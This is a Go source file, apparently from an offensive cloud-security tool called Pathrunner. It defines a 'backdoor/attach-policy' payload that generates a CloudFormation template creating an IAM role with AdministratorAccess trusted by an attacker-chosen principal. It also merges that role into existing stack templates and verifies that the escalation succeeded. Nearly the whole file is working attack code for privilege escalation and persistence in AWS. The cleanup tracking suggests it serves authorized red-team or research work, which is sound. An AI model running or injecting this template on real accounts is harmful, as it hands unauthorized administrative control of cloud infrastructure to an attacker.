package cloudformation

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
)

// BackdoorAttachPolicyPayload generates a CloudFormation template that creates a new IAM role
// with AdministratorAccess and a trust policy that allows the specified principal to assume it.
// This template is designed to be deployed by a CloudFormation service role with administrative
// permissions, resulting in the creation of a new admin role the attacker can then assume.
//
// GenerateCode returns a full CloudFormation template body (JSON string) ready to be passed
// directly to CloudFormation API calls that accept a TemplateBody parameter. For modules that
// update existing stacks, the Resources section from this template should be merged into the
// existing template's Resources section.
type BackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&BackdoorAttachPolicyPayload{})
}

func (p *BackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *BackdoorAttachPolicyPayload) GetDescription() string {
	return "Create an IAM role with AdministratorAccess trusted by the attacker's principal via CloudFormation template"
}

func (p *BackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceCloudFormation,
		payloads.TagLanguageJSON,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "ESCALATED_ROLE_NAME",
			Description: "Name for the new IAM role to create in the template. Auto-generated if not set",
			Required:    false,
		},
		{
			Name:        "TRUST_PRINCIPAL",
			Description: "IAM principal ARN to trust in the escalated role's trust policy. Defaults to current caller ARN",
			Required:    false,
		},
	}
}

func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	// Both ESCALATED_ROLE_NAME and TRUST_PRINCIPAL are resolved at execute time
	// by the module if not explicitly set, so validation only checks after resolution.
	return nil
}

// GenerateCode returns a full CloudFormation template body (JSON) that creates a new IAM role
// with AdministratorAccess and a trust policy allowing TRUST_PRINCIPAL to assume it.
// The template uses CAPABILITY_NAMED_IAM because the role name is explicitly set.
func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	escalatedRoleName := options["ESCALATED_ROLE_NAME"]
	trustPrincipal := options["TRUST_PRINCIPAL"]

	template := fmt.Sprintf(`{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Description": "Pathrunner cloudformation backdoor/attach-policy: creates admin IAM role trusting the starting principal",
  "Resources": {
    "PathrunnerEscalatedAdminRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "RoleName": %q,
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": { "AWS": %q },
              "Action": "sts:AssumeRole"
            }
          ]
        },
        "ManagedPolicyArns": [
          "arn:aws:iam::aws:policy/AdministratorAccess"
        ],
        "Tags": [
          { "Key": "ManagedBy", "Value": "Pathrunner" },
          { "Key": "Payload",   "Value": "backdoor/attach-policy" }
        ]
      }
    }
  },
  "Outputs": {
    "EscalatedRoleArn": {
      "Description": "ARN of the Pathrunner escalated admin role",
      "Value": { "Fn::GetAtt": [ "PathrunnerEscalatedAdminRole", "Arn" ] }
    }
  }
}`, escalatedRoleName, trustPrincipal)

	return template, nil
}

// ExtractResources parses a full CloudFormation template JSON and returns its Resources section
// as a map. This is used by update-stack modules that need to merge the payload's resources
// into an existing stack template rather than replacing it wholesale.
func ExtractResources(templateJSON string) (map[string]interface{}, error) {
	var tmpl map[string]interface{}
	if err := json.Unmarshal([]byte(templateJSON), &tmpl); err != nil {
		return nil, fmt.Errorf("failed to parse CloudFormation template JSON: %v", err)
	}

	resources, ok := tmpl["Resources"].(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("CloudFormation template has no Resources section")
	}

	return resources, nil
}

// MergeTemplate merges the Resources from payloadTemplateJSON into the existing
// CloudFormation template JSON. The existing template's other sections (Outputs, Parameters,
// etc.) are preserved. If a resource logical ID already exists in the existing template,
// the payload's version overwrites it. Returns the merged template as a JSON string.
//
// This is used by modules that update existing CloudFormation stacks (UpdateStack,
// UpdateStackSet, CreateChangeSet) to safely inject new resources alongside existing ones
// rather than replacing the entire template.
func MergeTemplate(existingTemplateJSON, payloadTemplateJSON string) (string, error) {
	// Parse the existing template.
	var existingTemplate map[string]interface{}
	if err := json.Unmarshal([]byte(existingTemplateJSON), &existingTemplate); err != nil {
		return "", fmt.Errorf("failed to parse existing CloudFormation template: %v", err)
	}

	// Extract the payload's resources.
	payloadResources, err := ExtractResources(payloadTemplateJSON)
	if err != nil {
		return "", fmt.Errorf("failed to extract payload template resources: %v", err)
	}

	// Ensure the existing template has a Resources section.
	existingResources, ok := existingTemplate["Resources"].(map[string]interface{})
	if !ok || existingResources == nil {
		existingResources = make(map[string]interface{})
		existingTemplate["Resources"] = existingResources
	}

	// Merge payload resources into the existing template.
	for logicalID, resource := range payloadResources {
		existingResources[logicalID] = resource
	}

	// Serialize the merged template back to JSON.
	mergedBytes, err := json.Marshal(existingTemplate)
	if err != nil {
		return "", fmt.Errorf("failed to serialize merged CloudFormation template: %v", err)
	}

	return string(mergedBytes), nil
}

// VerifySuccess checks whether the escalated role now exists with AdministratorAccess attached.
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
	escalatedRoleName := options["ESCALATED_ROLE_NAME"]
	if escalatedRoleName == "" {
		return false, fmt.Errorf("ESCALATED_ROLE_NAME not set; cannot verify")
	}

	iamClient := iam.NewFromConfig(config)
	result, err := iamClient.ListAttachedRolePolicies(ctx, &iam.ListAttachedRolePoliciesInput{
		RoleName: aws.String(escalatedRoleName),
	})
	if err != nil {
		return false, nil
	}

	for _, policy := range result.AttachedPolicies {
		if aws.ToString(policy.PolicyArn) == "arn:aws:iam::aws:policy/AdministratorAccess" {
			return true, nil
		}
	}

	return false, nil
}

// ReportSideEffects returns the created IAM role as a tracked resource for workspace cleanup.
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	escalatedRoleName := options["ESCALATED_ROLE_NAME"]
	trustPrincipal := options["TRUST_PRINCIPAL"]

	// Extract account ID from trust principal ARN if possible.
	accountID := ""
	if strings.HasPrefix(trustPrincipal, "arn:aws:iam::") {
		parts := strings.SplitN(trustPrincipal[len("arn:aws:iam::"):], ":", 2)
		if len(parts) >= 1 {
			accountID = parts[0]
		}
	}

	roleArn := ""
	if accountID != "" {
		roleArn = fmt.Sprintf("arn:aws:iam::%s:role/%s", accountID, escalatedRoleName)
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:role",
			Name:          escalatedRoleName,
			ARN:           roleArn,
			CleanupMethod: "iam:DeleteRole",
			Metadata: map[string]string{
				"role_name":         escalatedRoleName,
				"attached_policies": "arn:aws:iam::aws:policy/AdministratorAccess",
				"trust_principal":   trustPrincipal,
			},
		},
	}
}

// ProcessResult passes through the module's result string.
// CloudFormation modules construct their own output (including PATHFINDER_IDENTITY_DATA)
// because the escalated credential comes from an sts:AssumeRole call that the module
// performs after the stack completes, not from payload execution output.
func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
